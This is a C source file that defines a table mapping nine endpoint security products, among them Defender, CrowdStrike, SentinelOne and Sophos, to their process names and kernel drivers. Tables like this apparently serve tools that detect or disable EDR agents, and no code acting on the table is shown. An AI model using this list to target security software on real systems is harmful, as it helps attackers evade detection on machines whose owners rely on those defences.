#include "common.h"

EDR_MAP g_EDRMap[] = {
	{
		L"Microsoft Defender Antivirus",
		{
			L"MsMpEng.exe",                 // AV service
			L"NisSrv.exe",                  // Network Inspection Service
			L"MpDefenderCoreService.exe",   // Core platform service
			L"smartscreen.exe",             // SmartScreen
			NULL
		},
		{
			L"WdFilter.sys",
			NULL
		}
	},

	{
		L"Microsoft Defender for Endpoint",
		{
			L"MsSense.exe",                 // Sensor service
			L"SenseIR.exe",                 // IR process
			L"SenseNdr.exe",                // Network Detection and Response
			L"SenseCncProxy.exe",           // CNC proxy
			L"SenseSampleUploader.exe",     // Sample uploader
			L"SenseTVM.exe",                // Threat & Vulnerability Management
			NULL
		},
		{
			L"MsSecFlt.sys"
		}
	},

	{
		L"Elastic EDR",
		{
			L"elastic-agent.exe",			// Core Elastic Agent 
			L"elastic-endpoint.exe",		// Elastic Endpoint Security (EDR component)
			L"filebeat.exe",				// Collects and ships log files
			L"metricbeat.exe",				// Collects system and service metrics
			L"winlogbeat.exe",				// Collects Windows Event Logs
			L"agentbeat.exe",				// Collects logs
			NULL
		},
		{
			L"elastic-endpoint-driver.sys",
			NULL
		}
	},

	{
		L"Sysmon",
		{
			L"Sysmon.exe",
			NULL
		},
		{
			L"SysmonDrv.sys",
			NULL
		}
	},

	{
		L"BitDefender",
		{
			L"bdredline.exe",
			L"bdreinit.exe",
			L"EPConsole.exe",
			L"EPHost.exe",
			L"EPHost.Integrity.exe",
			L"EPHost.Integrity.Legacy.exe",
			L"EPIntegrationService.exe",
			L"EPLowPrivilegeWorker.exe",
			L"EPProtectedService.exe",
			L"EPSecurityService.exe",
			L"EPSupportManager.exe",
			L"EPUpdateService.exe",
			L"testinitsigs.exe",
			L"WscRemediation.exe",
			NULL
		},
		{
			L"vlflt.sys",
			L"ignisv2.sys",
			L"trufosalt.sys",
			L"bduefiscanalt.sys",
			NULL
		}
	},

	{
		L"CrowdStrike",
		{
			L"COMUtils.exe",
			L"CSDeviceControlSupportTool.exe",
			L"CSFalconContainer.exe",
			L"CSFalconController.exe",
			L"CSFalconService.exe",
			L"CSFirmwareAnalysisSupportTool.exe",
			L"CsScan.exe",
			L"CsScanCli.exe",
			L"CSSensorSettings.exe",
			NULL
		},
		{
			L"csagent.sys",
			L"cspcm4.sys",
			NULL
		}
	},

	{
		L"Palo Alto Cortex",
		{
			L"xdrhealth.exe",
			L"cydump.exe",
			L"cyreport.exe",
			L"cyrestart.exe",
			L"cyrprtui.exe",
			L"cysandbox.exe",
			L"cyserver.exe",
			L"cytool.exe",
			L"cytray.exe",
			L"cyuserserver.exe",
			L"CyveraConsole.exe",
			L"cywscsvc.exe",
			L"tlaworker.exe",
			NULL
		},
		{
			L"cyverak.sys",
			L"cyvrfsfd.sys",
			L"cyvrlpc.sys",
			L"cyvrmtgn.sys",
			L"tdevflt.sys",
			L"tedrdrv.sys",
			NULL
		}
	},

	{
		L"Sentinel",
		{
			L"SentinelRanger.exe",
			L"SentinelAgent.exe",
			L"SentinelAgentWorker.exe",
			L"SentinelBrowserNativeHost.exe",
			L"SentinelCtl.exe",
			L"SentinelHelperService.exe",
			L"SentinelMemoryScanner.exe",
			L"SentinelRemediation.exe",
			L"SentinelRemoteShellHost.exe",
			L"SentinelScanFromContextMenu.exe",
			L"SentinelServiceHost.exe",
			L"SentinelStaticEngine.exe",
			L"SentinelStaticEngineScanner.exe",
			L"SentinelUI.exe",
			NULL
		},
		{
			L"SentinelDeviceControl.sys",
			L"SentinelMonitor.sys",
			L"SentinelELAM.sys",
			NULL
		}
	},

	{
		L"Sophos",
		{
			L"AUTelem.exe",
			L"GatherTelem.exe",
			L"SubmitTelem.exe",
			L"SAUcli.exe",
			L"SophosLaunchUpdate.exe",
			L"SophosUpdate.exe",
			L"SEDcli.exe",
			L"SEDRecoveryService.exe",
			L"SEDService.exe",
			L"SEDTelemetry.exe",
			L"SophosArchiver.exe",
			L"SophosCleanup.exe",
			L"SophosFileSubmitter.exe",
			L"SophosIntelixPackager.exe",
			L"SophosInterceptXCLI.exe",
			L"SophosNA.exe",
			L"SophosRestore.exe",
			L"SophosSafestore.exe",
			L"SophosScanCoordinator.exe",
			L"SSPDevCon.exe",
			L"SSPService.exe",
			L"SSPTelemetry.exe",
			L"EfwTelemetryPlugin.exe",
			L"SophosESHTelemetry.exe",
			L"SophosDiag.exe",
			L"SophosESH.exe",
			L"SophosFIMService.exe",
			L"SophosFIMTelemetry.exe",
			L"SophosLiveQueryService.exe",
			L"SophosLiveQueryTelemetry.exe",
			L"SophosOsquery.exe",
			L"sophos-live-terminal.exe",
			L"sophos-winpty-agent.exe",
			L"SophosAmsiTelemetryCollector.exe",
			L"SophosFileScanner.exe",
			L"SophosFS.exe",
			L"SophosFSTelemetry.exe",
			L"SophosIPS.exe",
			L"SophosNetFilter.exe",
			L"SophosNtpService.exe",
			L"SophosNtpTelemetry.exe",
			L"SophosSAVICLI.exe",
			L"Sophos UI.exe",
			L"SophosScanLauncher.exe",
			L"SophosUITelemetry.exe",
			NULL
		},
		{
			L"SophosED.sys",
			L"sntp.sys",
			NULL
		}
	}
};

const SIZE_T g_EDRCount = sizeof(g_EDRMap) / sizeof(g_EDRMap[0]);